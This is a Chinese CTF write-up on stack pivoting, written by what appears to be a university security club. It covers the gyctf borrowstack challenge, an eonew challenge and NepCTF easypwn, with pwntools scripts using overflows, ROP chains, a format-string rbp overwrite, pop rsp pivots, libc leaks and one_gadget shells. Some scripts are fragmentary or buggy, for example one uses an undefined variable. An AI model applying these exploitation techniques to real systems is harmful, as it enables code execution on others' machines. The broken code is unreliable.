栈迁移专题

从今天开始，各个组会不定期更新一些题解，写的不好还请师傅们批评指正~

众所周知，x86_64维护栈的两个关键寄存器就是rbp、rsp，两个寄存器指向的的地址空间也就是一个个函数栈。本篇从栈迁移出发，研究在ctf之中对于rbp的一些利用姿势。

以下部分题的解法利用了leave指令将栈基址迁走, 还记得leave是哪两个指令么

mov rsp, rbp
pop rbp

将rsp的值修改成了rbp的值，而我们溢出的时候很容易修改rbp的值，那么这样我们实际上也就可以修改rsp的值，从而指定rsp的值的指向,听起来挺简单的对吧，但是下面的题值得一做，一起来看看吧。

gyctf_2020_borrowstack

from buu

分析：该题利用了栈迁移，有一个坑点是bank的地址距离got表特别近，构造rop的时候会增高栈帧，破坏got表，因此我们在做栈迁移的时候要把地址相对的抬高些

p.recvuntil('u want')

pause()

p.recvuntil('now!')

p.recvline()

libc_base=puts_add-0x06f690

payload3=b'a'*0x60+b'bbbbbbbb'+p64(one_gadget)

from Pwn Challenge

利用三个pop把重复执行main函数，但是由于只有未偏移的地址，采用爆破既拿到中间的数字确定偏移，又执行了三个pop重复main，写one_gadget拿到shell

#!/usr/bin/env python3
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h']

def leakBase():
    global sh
    p = remote("nc.eonew.cn","10004")
    p.recvuntil("preload end     ------------------------------\n")
    payload = b'a' * 0x88 + b'\x51' + b'\x13'
    p.sendline(payload)
    p.recv(0x88)
    c = p.recv().ljust(8, b'\x00')
    addr = u64(c) - 0x0000000000021351
    print("libc ==> " + hex(addr))
    return addr

while(1):
    base = leakBase()
    pop_rdi = 0x000000000002144f + base
    system = base + 0x415a6
    sleep(0.3)
    print("system ==> " + hex(system))
    payload = b'a' * 0x88 + p64(system)
    sh.sendline(payload)

    try:    
        p.recv(timeout=1)
        p.recv(timeout=1)
    except EOFError:
        p.close()
        continue
    p.interactive()

easypwn

from nepctf

  1. 格式化字符串修改 main 函数的 rbp 最后一个字节为 \x00 ，有几率刚好撞上 main 函数中输入的 teamname，利用多个ret扩大命中范围，否则大部分的脚本都会失败

  2. 由于 teamname 长度限制需要用 read 读取第二段 rop，利用pop rsp来进行任意地址的栈迁移，迁移到bss

  3. 在bss段泄露地址，制造bss端的read函数并且再次在read端写onegadget

#!/usr/bin/env python3
from pwn import *
elf = ELF('./easypwn')
libc = ELF('./libc-2.27.so')
context(os='linux', arch='amd64', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h']


while True:
    try:
        p = process('./easypwn')
        bss_addr = elf.bss() + 0x500
        pop_rsi_r15 = 0x0000000000400be1
        pop_rdi = 0x0000000000400be3
        ret = 0x0000000000400B7F
        pop_rsp = 0x0000000000400bdd
        payload = p64(ret) * 0x10 + p64(pop_rdi) + p64(0) + p64(pop_rsi_r15)
        payload += p64(bss_addr) + p64(0) + p64(elf.plt['read']) + p64(pop_rsp) + p64(bss_addr)
        one = [0x4f3d5, 0x4f432, 0x10a41c]

        #gdb.attach(r, "b *0x0000000000400B7F")
        p.sendafter("Please input your teamname: ", payload[-0x50:])
        p.sendafter("input your name", b'%22$hhn')
        p.sendafter('input introduction', payload[-0x38:])

        rop = p64(0) * 3 + p64(pop_rdi) + p64(elf.got['read']) + p64(elf.plt['puts']) + p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(bss_addr + 0x60) + p64(0) + p64(elf.plt['read'])
        p.sendline(rop)
        libc_base = u64(p.recvuntil('\x7f', timeout=1)[-6:].ljust(8, b'\x00')) - libc.sym['read']
        log.info("libc_base:" + str(hex(libc_base)))
        if libc_base <= 0:
            raise EOFError
        one_gadget = libc_base + one[2]

        p.send(p64(one_gadget))
        p.interactive()
    except:
        pass
